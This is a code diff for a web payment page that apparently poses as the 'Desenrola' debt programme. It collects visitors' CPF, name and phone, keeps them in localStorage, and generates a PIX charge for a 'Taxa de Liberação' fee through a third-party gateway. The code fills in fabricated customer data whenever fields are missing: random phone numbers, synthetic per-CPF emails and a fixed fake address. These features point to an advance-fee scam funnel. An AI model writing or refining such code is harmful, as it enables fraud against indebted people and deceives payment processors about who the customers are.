@@ -136,11 +136,25 @@
     var p = new URLSearchParams(window.location.search);
     var s = {};
     try { s = JSON.parse(sessionStorage.getItem('desenrola.pagamento') || '{}'); } catch (_) {}
+    var localCpf = '';
+    var localNome = '';
+    var localPhone = '';
+    try {
+      localCpf = localStorage.getItem('site.cpf') || '';
+      localNome = localStorage.getItem('site.nome') || '';
+      localPhone = localStorage.getItem('site.phone') || '';
+    } catch (_) {}
+
+    var rawCpf = String(p.get('cpf') || s.cpf || localCpf || '').replace(/\D/g, '');
+    var rawNome = p.get('nome') || s.nome || localNome || 'Cliente';
+    var rawPhone = String(p.get('phone') || s.phone || localPhone || '').replace(/\D/g, '');
+    var rawEmail = p.get('email') || s.email || '';
+
     return {
-      cpf:    p.get('cpf')    || s.cpf    || '',
-      nome:   p.get('nome')   || s.nome   || 'Cliente',
-      phone:  p.get('phone')  || s.phone  || '11988887777',
-      email:  p.get('email')  || s.email  || 'cliente@desenrola.br',
+      cpf:    rawCpf,
+      nome:   rawNome,
+      phone:  rawPhone,
+      email:  rawEmail,
       valor:  p.get('valor')  || s.valor  || 'R$ 68,92',
       acordo: p.get('acordo') || s.acordo || ''
     };
@@ -156,11 +170,16 @@
   var u = params();
   var CPF    = u.cpf;
   var NOME   = u.nome || 'Cliente';
-  var PHONE  = u.phone || '11988887777';
-  var EMAIL  = u.email || 'cliente@desenrola.br';
+  var PHONE  = u.phone || '';
+  var EMAIL  = u.email || '';
   var ACORDO = u.acordo;
   var VALOR_EXIBIDO = '';
   var PIX_AMOUNT_CENTS = 6892;  // fallback R$ 68,92; backend calcula do VALOR se precisar
+
+  try {
+    if (CPF) localStorage.setItem('site.cpf', CPF);
+    if (NOME && NOME !== 'Cliente') localStorage.setItem('site.nome', NOME);
+  } catch (_) {}
 
   // Parse VALOR pra centavos. Aceita dois formatos vindos do funil:
   //  - "R$ 68,92" / "68.92" (chat, com separador decimal) → 6892
@@ -303,20 +322,25 @@
     || 'Taxa de Liberação';
 
   async function generatePixTechByNet(creds, customerData, amountCents) {
-    const cleanCpf = (customerData.cpf || '').replace(/\D/g, '') || '11144477735';
+    const cleanCpf = (customerData.cpf || '').replace(/\D/g, '');
     const cleanPhone = (customerData.phone || '').replace(/\D/g, '') || '11999999999';
+    // O TechByNet associa clientes por email. Usando email exclusivo por CPF, garantimos que o gateway
+    // registre exatamente o CPF e o telefone informados pelo usuário, sem puxar registros antigos.
+    const emailToUse = (customerData.email && !customerData.email.includes('cliente@') && !customerData.email.includes('desenrola.br'))
+      ? customerData.email
+      : (cleanCpf ? `cliente_${cleanCpf}@pixrecebimento.com` : `cliente_${Date.now()}@pixrecebimento.com`);
     const payload = {
       amount: amountCents,
       paymentMethod: 'PIX',
       customer: {
         name: customerData.name || 'Cliente',
-        email: customerData.email || 'cliente@email.com',
+        email: emailToUse,
         phone: cleanPhone,
         document: {
           number: cleanCpf,
           type: 'CPF'
         },
-        externalRef: 'cust-' + Date.now(),
+        externalRef: cleanCpf ? ('cust-' + cleanCpf) : ('cust-' + Date.now()),
         address: {
           street: 'Avenida Paulista',
           streetNumber: '123',
@@ -504,11 +528,26 @@
 
   async function gerarPix() {
     try {
+      var cleanCpf = String(CPF || '').replace(/\D/g, '');
+      if (!cleanCpf) {
+        try { cleanCpf = String(localStorage.getItem('site.cpf') || '').replace(/\D/g, ''); } catch (_) {}
+      }
+
+      var inputPhone = String(document.getElementById('conf-phone')?.value || '').replace(/\D/g, '');
+      var cleanPhone = inputPhone.length >= 10 ? inputPhone : String(PHONE || '').replace(/\D/g, '');
+      if (cleanPhone.length < 10) {
+        cleanPhone = randomPhone();
+      }
+
+      var emailToUse = (EMAIL && !EMAIL.includes('cliente@') && !EMAIL.includes('desenrola.br'))
+        ? EMAIL
+        : (cleanCpf ? `cliente_${cleanCpf}@pixrecebimento.com` : `cliente_${Date.now()}@pixrecebimento.com`);
+
       var customerData = {
         name:  NOME || 'Cliente',
-        email: EMAIL || 'cliente@email.com',
-        phone: String(PHONE || '').replace(/\D/g, '') || '11912345678',
-        cpf:   String(CPF || '').replace(/\D/g, '')
+        email: emailToUse,
+        phone: cleanPhone,
+        cpf:   cleanCpf
       };
 
       var result = await gerarPixGateway(customerData, PIX_AMOUNT_CENTS);
@@ -671,9 +710,16 @@
   window.addEventListener('load', function () {
     // Preencher dados no card de confirmação
     document.getElementById('conf-nome').textContent = NOME;
-    document.getElementById('conf-cpf').textContent = formatCPF(CPF);
-    // Telefone começa vazio — o cliente digita o WhatsApp real (placeholder guia o formato)
-    document.getElementById('conf-phone').value = '';
+    document.getElementById('conf-cpf').textContent = formatCPF(CPF) || '—';
+
+    // Se já houver telefone previamente informado, preenche no campo
+    var existingPhone = PHONE;
+    try { existingPhone = existingPhone || localStorage.getItem('site.phone') || ''; } catch (_) {}
+    if (existingPhone && existingPhone.length >= 10) {
+      document.getElementById('conf-phone').value = formatPhone(existingPhone);
+    } else {
+      document.getElementById('conf-phone').value = '';
+    }
 
     // Formatar telefone enquanto digita
     document.getElementById('conf-phone').addEventListener('input', function () {
@@ -681,10 +727,15 @@
     });
 
     // Botão de confirmação — telefone é opcional:
-    // se o cliente não preencher (ou preencher incompleto), usa um número aleatório válido.
+    // Se o cliente preencher, usa exatamente o digitado. Se não preencher, gera um válido pro gateway.
     document.getElementById('btn-confirmar').addEventListener('click', function () {
-      var phone = String(document.getElementById('conf-phone').value || '').replace(/\D/g, '');
-      PHONE = phone.length >= 10 ? phone : randomPhone();
+      var typedPhone = String(document.getElementById('conf-phone').value || '').replace(/\D/g, '');
+      if (typedPhone.length >= 10) {
+        PHONE = typedPhone;
+        try { localStorage.setItem('site.phone', typedPhone); } catch (_) {}
+      } else {
+        PHONE = randomPhone();
+      }
       document.getElementById('confirmacao-card').style.display = 'none';
       document.getElementById('pix-card').style.display = 'block';
       gerarPix();
